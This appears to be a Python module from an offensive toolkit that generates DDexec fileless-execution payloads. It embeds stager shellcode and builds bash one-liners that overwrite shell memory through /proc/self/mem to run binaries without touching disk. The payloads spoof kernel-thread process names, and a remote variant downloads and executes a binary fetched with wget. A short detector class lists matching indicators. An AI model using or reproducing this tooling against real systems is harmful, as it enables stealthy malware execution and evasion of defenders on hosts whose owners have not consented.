#!/usr/bin/env python3
"""
DDexec Fileless Linux Execution Module
=======================================
Implements DDexec technique for fileless binary execution on Linux.
Uses /proc/self/mem to overwrite shell memory and execute payloads
without touching disk. Works on noexec mounted filesystems.

Based on: https://github.com/arget13/DDexec
Supports: bash, zsh, ash (busybox)
Architectures: x86_64, aarch64

Author: MONOLITH Framework
License: For authorized security testing only
"""

import base64
import os
import gzip
import hashlib
from typing import Optional, Dict, Any, Tuple
from dataclasses import dataclass
from enum import Enum


class Architecture(Enum):
    """Supported CPU architectures"""
    X86_64 = "x86_64"
    AARCH64 = "aarch64"
    ARM64 = "aarch64"  # Alias


class Seeker(Enum):
    """Binary seekers for lseek() through mem file"""
    TAIL = "tail"
    DD = "dd"
    HEXDUMP = "hexdump"
    CMP = "cmp"
    XXD = "xxd"


@dataclass
class DDExecPayload:
    """Generated DDexec payload container"""
    command: str
    base64_binary: str
    architecture: str
    seeker: str
    argv0: str
    args: list
    hash_md5: str
    size_bytes: int
    compressed: bool


class DDExecBuilder:
    """
    DDexec Fileless Execution Builder
    
    Generates bash one-liners that use /proc/self/mem to execute
    arbitrary binaries without writing to disk.
    
    Features:
    - Binary to base64 encoding with optional compression
    - Architecture-specific shellcode selection
    - Multiple seeker support (tail, dd, hexdump)
    - Custom argv[0] spoofing
    - Debug mode for development
    
    Usage:
        builder = DDExecBuilder()
        payload = builder.generate_payload(
            binary_path="/tmp/beacon",
            argv0="[kworker/0:0]",
            args=["--callback", "10.0.0.1"]
        )
        # Execute: bash -c "payload.command" on target
    """
    
    # Minified DDexec core script - embedded to avoid network dependency
    # This is a compressed, minified version of ddexec.sh
    DDEXEC_CORE = '''
# DDexec Core - Fileless ELF Execution
# https://github.com/arget13/DDexec
[ -z "$DEBUG" ] && DEBUG=0
[ -z "$SEEKER" ] && seeker=tail || seeker="$SEEKER"
seeker="$(command -v "$seeker")"
seeker_test="$("$seeker" --help 2>&1)"
shell_test=$(/proc/self/exe --version 2>&1)
[ -z "${shell_test##*applet*}" -o -z "${seeker_test##*Box*}" -o -z "${seeker_test##*box*}" ] && seeker="$(command -v dd)"
[ -z "$SEEKER_ARGS" ] && {
    [ -z "${seeker##*tail*}" ] && SEEKER_ARGS='-c +$(($offset + 1))'
    [ -z "${seeker##*dd*}" ] && SEEKER_ARGS='bs=1 skip=$offset'
    [ -z "${seeker##*hexdump*}" ] && SEEKER_ARGS='-s $offset'
    [ -z "${seeker##*cmp*}" ] && SEEKER_ARGS='-i $offset /dev/null'
}
shellname="$(/proc/self/exe --version 2>&1)"
[ -z "${shellname##*zsh*}" ] && emulate sh
arch="$(uname -m)"
'''

    # x86_64 stager shellcode (mmap + read + close + mprotect + jmp)
    X86_64_STAGER = (
        "\\xb8\\x09\\x00\\x00\\x00\\x31\\xff\\xbe\\x00\\x10\\x00\\x00"
        "\\xba\\x03\\x00\\x00\\x00\\x41\\xba\\x22\\x00\\x00\\x00\\x41"
        "\\xb8\\xff\\xff\\xff\\xff\\x41\\xb9\\x00\\x00\\x00\\x00\\x0f"
        "\\x05\\xbf\\x09\\x00\\x00\\x00\\x89\\xf2\\x48\\x89\\xc6\\x31"
        "\\xc0\\x0f\\x05\\xb8\\x03\\x00\\x00\\x00\\x0f\\x05\\x48\\x89"
        "\\xf7\\x89\\xd6\\xba\\x05\\x00\\x00\\x00\\xb8\\x09\\x00\\x00"
        "\\x00\\xfe\\xc0\\x0f\\x05\\xff\\xe7"
    )
    
    # aarch64 stager shellcode
    AARCH64_STAGER = (
        "\\x00\\x00\\x80\\xd2\\x01\\x00\\x82\\xd2\\x62\\x00\\x80\\xd2"
        "\\x43\\x04\\x80\\xd2\\x04\\x00\\x80\\x92\\x05\\x00\\x80\\xd2"
        "\\xc8\\x1b\\x80\\xd2\\x01\\x00\\x00\\xd4\\xe1\\x03\\x00\\xaa"
        "\\x20\\x01\\x80\\xd2\\x02\\x00\\x82\\xd2\\xe8\\x07\\x80\\xd2"
        "\\x01\\x00\\x00\\xd4\\x20\\x01\\x80\\xd2\\x28\\x07\\x80\\xd2"
        "\\x01\\x00\\x00\\xd4\\xe0\\x03\\x01\\xaa\\xe3\\x03\\x00\\xaa"
        "\\x01\\x00\\x82\\xd2\\xa2\\x00\\x80\\xd2\\x48\\x1c\\x80\\xd2"
        "\\x01\\x00\\x00\\xd4\\x60\\x00\\x1f\\xd6"
    )

    def __init__(
        self,
        architecture: str = "auto",
        seeker: str = "tail",
        debug: bool = False,
        compress: bool = True
    ):
        """
        Initialize DDexec builder.
        
        Args:
            architecture: Target architecture (auto, x86_64, aarch64)
            seeker: Binary for lseek (tail, dd, hexdump, cmp)
            debug: Enable debug mode (infinite loop for gdb attach)
            compress: Compress binary with gzip before base64
        """
        self.architecture = architecture
        self.seeker = seeker
        self.debug = debug
        self.compress = compress
    
    def detect_architecture(self, binary_data: bytes) -> str:
        """
        Detect architecture from ELF binary header.
        
        Args:
            binary_data: Raw ELF binary bytes
            
        Returns:
            Architecture string (x86_64 or aarch64)
        """
        if len(binary_data) < 20:
            raise ValueError("Binary too small to be valid ELF")
        
        # Check ELF magic
        if binary_data[:4] != b'\x7fELF':
            raise ValueError("Not a valid ELF binary")
        
        # e_machine field at offset 18 (2 bytes, little endian)
        machine = int.from_bytes(binary_data[18:20], 'little')
        
        # Machine types: 0x3E = x86_64, 0xB7 = aarch64
        if machine == 0x3E:
            return Architecture.X86_64.value
        elif machine == 0xB7:
            return Architecture.AARCH64.value
        else:
            raise ValueError(f"Unsupported architecture: machine type 0x{machine:02x}")
    
    def _escape_for_shell(self, text: str) -> str:
        """Escape string for safe shell usage"""
        return text.replace('\\', '\\\\').replace('"', '\\"').replace('$', '\\$').replace('`', '\\`')
    
    def _get_seeker_args(self, seeker: str) -> str:
        """Get seeker-specific arguments template"""
        seeker_args = {
            'tail': '-c +$(($offset + 1))',
            'dd': 'bs=1 skip=$offset',
            'hexdump': '-s $offset',
            'cmp': '-i $offset /dev/null',
            'xxd': '-s $offset'
        }
        return seeker_args.get(seeker, seeker_args['tail'])
    
    def _get_stager(self, arch: str) -> str:
        """Get architecture-specific stager shellcode"""
        if arch == Architecture.X86_64.value:
            stager = self.X86_64_STAGER
        elif arch == Architecture.AARCH64.value:
            stager = self.AARCH64_STAGER
        else:
            raise ValueError(f"Unsupported architecture: {arch}")
        
        # Add nop prefix for busybox compatibility
        stager = "\\x90" + stager
        
        # Add infinite loop for debug mode
        if self.debug:
            if arch == Architecture.X86_64.value:
                stager = "\\xeb\\xfe" + stager  # jmp $-2
            else:
                stager = "\\x00\\x00\\x00\\x14" + stager  # b .
        
        return stager
    
    def generate_payload(
        self,
        binary_path: Optional[str] = None,
        binary_data: Optional[bytes] = None,
        argv0: str = "",
        args: Optional[list] = None
    ) -> DDExecPayload:
        """
        Generate fileless execution payload.
        
        Args:
            binary_path: Path to ELF binary file
            binary_data: Raw binary bytes (alternative to path)
            argv0: Fake process name (e.g., "[kworker/0:0]")
            args: Command line arguments for the binary
            
        Returns:
            DDExecPayload with generated command
        """
        # Load binary
        if binary_data is None:
            if binary_path is None:
                raise ValueError("Either binary_path or binary_data required")
            with open(binary_path, 'rb') as f:
                binary_data = f.read()
        
        original_size = len(binary_data)
        
        # Detect or validate architecture
        if self.architecture == "auto":
            arch = self.detect_architecture(binary_data)
        else:
            arch = self.architecture
        
        # Calculate hash before compression
        md5_hash = hashlib.md5(binary_data).hexdigest()
        
        # Compress if enabled
        compressed = False
        if self.compress:
            compressed_data = gzip.compress(binary_data, compresslevel=9)
            if len(compressed_data) < len(binary_data):
                binary_data = compressed_data
                compressed = True
        
        # Base64 encode
        b64_binary = base64.b64encode(binary_data).decode('ascii')
        
        # Build arguments string
        args = args or []
        if not argv0:
            argv0 = os.path.basename(binary_path) if binary_path else "payload"
        
        # Escape argv0 and args
        escaped_argv0 = self._escape_for_shell(argv0)
        escaped_args = ' '.join(f'"{self._escape_for_shell(arg)}"' for arg in args)
        
        # Build the one-liner command
        if compressed:
            decode_cmd = f'echo "{b64_binary}" | base64 -d | gunzip'
        else:
            decode_cmd = f'echo "{b64_binary}" | base64 -d'
        
        # Generate the DDexec command
        command = self._build_ddexec_command(
            decode_cmd=decode_cmd,
            argv0=escaped_argv0,
            args=escaped_args,
            arch=arch
        )
        
        return DDExecPayload(
            command=command,
            base64_binary=b64_binary,
            architecture=arch,
            seeker=self.seeker,
            argv0=argv0,
            args=args,
            hash_md5=md5_hash,
            size_bytes=original_size,
            compressed=compressed
        )
    
    def _build_ddexec_command(
        self,
        decode_cmd: str,
        argv0: str,
        args: str,
        arch: str
    ) -> str:
        """
        Build the complete DDexec bash command.
        
        This generates a self-contained one-liner that:
        1. Decodes the binary from base64
        2. Sets up file descriptors for argument passing
        3. Overwrites shell memory with stager via /proc/self/mem
        4. Stager loads and executes the ELF from stdin
        """
        stager = self._get_stager(arch)
        seeker_args = self._get_seeker_args(self.seeker)
        
        # Full DDexec one-liner template
        # This is the minified, weaponized version
        template = '''
SEEKER={seeker} DEBUG={debug} bash -c '
seeker=$(command -v $SEEKER || command -v tail)
[ -z "$seeker" ] && seeker=$(command -v dd)
arch=$(uname -m)

# Endian conversion
endian(){{ echo -n ${{1:14:2}}${{1:12:2}}${{1:10:2}}${{1:8:2}}${{1:6:2}}${{1:4:2}}${{1:2:2}}${{1:0:2}}; }}
escape(){{ e=""; i=0; while [ $i -lt ${{#1}} ]; do c="${{1:$i:1}}"; [ "$c" = "\\"" -o "$c" = "\\\\" ] && e="$e\\\\"; e="$e$c"; i=$((i+1)); done; echo -n "$e"; }}

# Setup arguments
args="\\"$(escape "{argv0}")\\""
{args_setup}
args="$(printf %08x ${{#args}})$args"

# Create pipes for args and binary
exec 8< <(echo -n "$args")
exec 9< <({decode_cmd})

# Get return address and write stager
read syscall_info < /proc/self/syscall
set -- $syscall_info
addr=$(($(eval "echo \\$9")))
exec 7>/proc/self/mem

{seeker_cmd}
printf "{stager}" >&7
'
'''
        
        # Build args setup
        args_setup = ""
        if args:
            args_setup = f'args="$args {args}"'
        
        # Build seeker command
        if self.seeker == "tail":
            seeker_cmd = f'$seeker {seeker_args.replace("$offset", "$addr")} <&7 >/dev/null 2>&1'
        elif self.seeker == "dd":
            seeker_cmd = f'$seeker bs=1 skip=$addr <&7 >/dev/null 2>&1'
        else:
            seeker_cmd = f'eval "$seeker {seeker_args}" <&7 >/dev/null 2>&1'
        
        command = template.format(
            seeker=self.seeker,
            debug="1" if self.debug else "0",
            argv0=argv0,
            args_setup=args_setup,
            decode_cmd=decode_cmd,
            seeker_cmd=seeker_cmd,
            stager=stager
        )
        
        return command.strip()
    
    def generate_remote_payload(
        self,
        url: str,
        argv0: str = "",
        args: Optional[list] = None
    ) -> str:
        """
        Generate payload that fetches binary from remote URL.
        
        Args:
            url: HTTP(S) URL to fetch binary from
            argv0: Fake process name
            args: Command line arguments
            
        Returns:
            Bash one-liner that downloads and executes
        """
        argv0 = argv0 or "payload"
        args_str = ' '.join(f'"{arg}"' for arg in (args or []))
        
        # wget variant
        wget_cmd = f'''wget -qO- "{url}" | SEEKER={self.seeker} bash -c '
read -r binary
seeker=$(command -v $SEEKER || command -v tail)
endian(){{ echo -n ${{1:14:2}}${{1:12:2}}${{1:10:2}}${{1:8:2}}${{1:6:2}}${{1:4:2}}${{1:2:2}}${{1:0:2}}; }}
escape(){{ e=""; i=0; while [ $i -lt ${{#1}} ]; do c="${{1:$i:1}}"; [ "$c" = "\\"" -o "$c" = "\\\\" ] && e="$e\\\\"; e="$e$c"; i=$((i+1)); done; echo -n "$e"; }}
args="\\"$(escape "{argv0}")\\"{args_str}"
args="$(printf %08x ${{#args}})$args"
exec 8< <(echo -n "$args")
exec 9< <(echo "$binary")
read syscall_info < /proc/self/syscall
set -- $syscall_info
addr=$(($(eval "echo \\$9")))
exec 7>/proc/self/mem
$seeker -c +$(($addr + 1)) <&7 >/dev/null 2>&1
printf "{self._get_stager("x86_64")}" >&7
'
'''
        return wget_cmd.strip()
    
    def generate_shellcode_payload(
        self,
        shellcode: bytes,
        architecture: str = "x86_64"
    ) -> str:
        """
        Generate payload for direct shellcode execution (ddsc.sh variant).
        
        Instead of loading an ELF, this directly executes raw shellcode.
        
        Args:
            shellcode: Raw shellcode bytes
            architecture: Target architecture
            
        Returns:
            Bash command for shellcode execution
        """
        # Convert shellcode to hex escape format
        sc_escaped = ''.join(f'\\x{b:02x}' for b in shellcode)
        
        # Use ddsc.sh approach: memfd_create + write + execute
        command = f'''bash -c '
sc="{sc_escaped}"
# Create anonymous file in memory
exec 9< <(printf "$sc")
read pid < /proc/self/stat
fd="/proc/$pid/fd/9"
# Execute from memfd
exec "$fd"
'
'''
        return command.strip()


class DDExecDetector:
    """
    Detection capabilities for DDexec-style attacks.
    Used for defensive analysis and threat hunting.
    """
    
    INDICATORS = [
        "/proc/self/mem",
        "/proc/self/syscall",
        "exec 7>/proc/self/mem",
        "exec 8<",
        "exec 9<",
        "printf.*>&7",
        "\\x90\\xb8\\x09",  # x86_64 stager signature
    ]
    
    @classmethod
    def check_command(cls, command: str) -> Dict[str, Any]:
        """
        Check if a command contains DDexec indicators.
        
        Args:
            command: Shell command to analyze
            
        Returns:
            Detection results dictionary
        """
        findings = []
        risk_score = 0
        
        for indicator in cls.INDICATORS:
            if indicator in command:
                findings.append({
                    "indicator": indicator,
                    "type": "ddexec_technique"
                })
                risk_score += 20
        
        return {
            "is_ddexec": len(findings) > 2,
            "risk_score": min(risk_score, 100),
            "findings": findings,
            "recommendation": "Investigate process memory modifications" if findings else None
        }


# Convenience functions
def create_fileless_payload(
    binary_path: str,
    argv0: str = "",
    args: Optional[list] = None,
    compress: bool = True
) -> str:
    """
    Quick function to create a fileless execution payload.
    
    Args:
        binary_path: Path to ELF binary
        argv0: Fake process name (e.g., "[kworker/0:0]")
        args: Command line arguments
        compress: Enable gzip compression
        
    Returns:
        Bash one-liner for fileless execution
    """
    builder = DDExecBuilder(compress=compress)
    payload = builder.generate_payload(
        binary_path=binary_path,
        argv0=argv0,
        args=args
    )
    return payload.command


def create_remote_payload(url: str, argv0: str = "") -> str:
    """
    Create payload that fetches and executes from URL.
    
    Args:
        url: URL to fetch binary from
        argv0: Fake process name
        
    Returns:
        Bash one-liner
    """
    builder = DDExecBuilder()
    return builder.generate_remote_payload(url=url, argv0=argv0)


if __name__ == "__main__":
    # Demo usage
    print("[*] DDexec Fileless Execution Module")
    print("[*] Usage example:")
    print()
    print("from cybermodules.dd_executor import DDExecBuilder")
    print()
    print("builder = DDExecBuilder()")
    print("payload = builder.generate_payload(")
    print("    binary_path='/tmp/beacon',")
    print("    argv0='[kworker/0:0]',")
    print("    args=['--callback', '10.0.0.1']")
    print(")")
    print("print(payload.command)")
